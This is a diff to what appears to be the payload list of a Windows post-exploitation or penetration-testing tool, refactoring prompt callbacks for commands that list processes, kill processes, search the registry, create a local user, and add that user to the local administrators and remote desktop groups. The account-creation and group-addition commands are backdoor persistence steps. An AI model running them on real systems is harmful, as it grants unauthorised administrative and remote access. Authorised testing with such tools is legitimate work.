@@ -57,15 +57,19 @@ Load({ payload: "tasklist /svc", desc: "Show processes & services", category: "S
 Load({ payload: "tasklist /m", desc: "Show processes & DLLs", category: "System Info"})
 Load({ payload: "net localgroup administrators", desc: "Prints local admins", category: "System Info"})
 Load({ payload: "net session", desc: "Check for elevated rights (an access denied error will return if not elevated)", category: "System Info"})
-Load({ payload: "net user username password /ADD", desc: "Create new local user", category: "System Info"})
-Load({ payload: "net localgroup administrators username /add", desc: "Add user to local admins group", category: "System Info"})
+Load({ payload: "net user <PROMPT (username)> <PROMPT (password)> /ADD", desc: "Create new local user",callback: function(bro){question("What user would you like to add?");question("What password would you like to use?");ask.some(questions, bro);}, category: "System Info"})
+Load({desc: "Add user to local admins group",payload: "net localgroups administrators <PROMPT (username)> /add",callback: function(bro){question("What user would you like to add?");ask.some(questions, bro);},category: "System Info"});
+Load({desc: "Add user to remote desktop group",payload: "net localgroup \"remote desktop users\" <PROMPT (username)> /add",callback: function(bro){question("What user would you like to add?");ask.some(questions, bro);},category: "System Info"});
+
+
 
 Load({
 	payload: "taskkill /PID <PROMPT (pid)> /F",
 	desc: "Force process to terminate",
 	category: "System Info",
-	callback: function(returnToPrepare, lhost, lport, rhost, rport, user){
-		question.ask("What PID would you like to terminate?", returnToPrepare)
+	callback: function(bro){
+		question("What PID would you like to terminate?");
+		ask.some(questions,bro);
 	}
 })
 
@@ -73,8 +77,9 @@ Load({
 	payload: "reg query HKLM /f <PROMPT (search term)> /t REG_SZ /s",
 	desc: "Search registry for value",
 	category: "System Info",
-	callback: function(returnToPrepare, lhost, lport, rhost, rport, user){
-		question.ask("What term would you like to search for?", returnToPrepare)
+	callback: function(bro){
+		question("What term would you like to search for?");
+		ask.some(questions,bro);
 	}
 })
 
